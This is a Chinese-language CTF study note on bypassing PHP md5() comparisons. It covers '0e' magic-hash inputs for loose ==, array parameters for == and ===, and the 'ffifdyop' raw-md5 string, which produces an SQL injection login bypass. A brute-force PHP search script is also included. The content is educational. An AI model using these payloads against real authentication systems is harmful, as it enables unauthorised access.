# MD5绕过总结

[TOC]

---

```php
md5(string,raw)
```

| 参数   | 描述                                                         |
| :----- | ------------------------------------------------------------ |
| string | 必需。要计算的字符串。                                       |
| raw    | 可选。默认不写为FALSE：32位16进制的字符串。TRUE：16位原始二进制格式的字符串 |

## 基本方法

小总结：

1. MD5弱类型比较（俩等号的）

**数组绕过**

2. MD5强类型比较（三等号的）

**数组绕过**

3. 自己等于md5加密后的自己

**科学计数法绕过**

### `==`类型

#### 方法一

```php
<?php 
$v1 = $_GET['v1'];
$v2 = $_GET['v2'];

if (isset($v1) and isset($v2)) {
    if ($v1 != $v2 and md5($v1) == md5($v2)) {
        die("success!");
    }
}
show_source(__FILE__);
?>
```

审计过后得知，需要满足`v1`不等于`v2`，同时两个变量的md5值相同

由于这里使用的是 `==` 故而可能存在弱类型转换，假设 `$v1` 进行 md5 加密之后得到：`0e*************`，`$v2` 进行 md5 加密之后得到：`0e*************` 。

那么经过 `==` 比较，两者是相等的，因为 PHP 会将其看做是科学计数法。0 的任何次方都得 0，故而就是 `0` == `0`



列举一些例子：

```bash
$md5 						md5($md5)
s878926199a					0e545993274517709034328855841020
s155964671a					0e342768416822451524974117254469
s214587387a					0e848240448830537924465865611904
s214587387a					0e848240448830537924465865611904
s878926199a					0e545993274517709034328855841020
s1091221200a				0e940624217856561557816327384675
s1885207154a				0e509367213418206700842008763514
s1502113478a				0e861580163291561247404381396064
s1885207154a				0e509367213418206700842008763514
s1836677006a				0e481036490867661113260034900752
s155964671a					0e342768416822451524974117254469
s1184209335a				0e072485820392773389523109082030
s1665632922a				0e731198061491163073197128363787
s1502113478a				0e861580163291561247404381396064
s1836677006a				0e481036490867661113260034900752
s1091221200a				0e940624217856561557816327384675
s155964671a					0e342768416822451524974117254469
s1502113478a				0e861580163291561247404381396064
s155964671a					0e342768416822451524974117254469
s1665632922a				0e731198061491163073197128363787
s155964671a					0e342768416822451524974117254469
s1091221200a				0e940624217856561557816327384675
s1836677006a				0e481036490867661113260034900752
s1885207154a				0e509367213418206700842008763514
s532378020a					0e220463095855511507588041205815
s878926199a					0e545993274517709034328855841020
s1091221200a				0e940624217856561557816327384675
s214587387a					0e848240448830537924465865611904
s1502113478a				0e861580163291561247404381396064
s1091221200a				0e940624217856561557816327384675
s1665632922a				0e731198061491163073197128363787
s1885207154a				0e509367213418206700842008763514
s1836677006a				0e481036490867661113260034900752
s1665632922a				0e731198061491163073197128363787
s878926199a					0e545993274517709034328855841020
QNKCDZO						0e830400451993494058024219903391
```



#### 方法二 ---数组绕过

```http
v1[]= 1&v2[]= 2
```

> md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果`$str1`和`$str2`都是数组则双双返回FALSE, 两个FALSE相等得以绕过



### `===`强比较

>  `===` 强等于，先比较其数据类型再比较其值，不会进行类型转换。故而例题 - 1 的做法，在这里就不生效了。

直接采用传入数组的方式





### 万能密码

> **MySQL的一个特性：**
>
> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。

要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。

当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。
当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）

```plain
select * from `admin` where password=''or'1abcdefg'    --->  True
select * from `admin` where password=''or'0abcdefg'    --->  False
select * from `admin` where password=''or'1'           --->  True
select * from `admin` where password=''or'2'           --->  True
select * from `admin` where password=''or'0'           --->  False
```

```php
<?php 
for ($i = 0;;) { 
 for ($c = 0; $c < 1000000; $c++, $i++)
  if (stripos(md5($i, true), '\'or\'') !== false)
   echo "\nmd5($i) = " . md5($i, true) . "\n";
 echo ".";
}
?>
```

这里提供一个最常用的：

***ffifdyop***

该字符串md5加密后若md5()的参数为True时会返回 **'or’6<trash>** (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)

所以如果这里我们输入ffifdyop，后端的SQL语句会变成：

```plain
select * from `admin` where password=''or'6<trash>'           --->  True
```

## 资源

CTF中的弱比较和MD5绕过：https://www.qwesec.com/2024/02/ctfweb-md5.html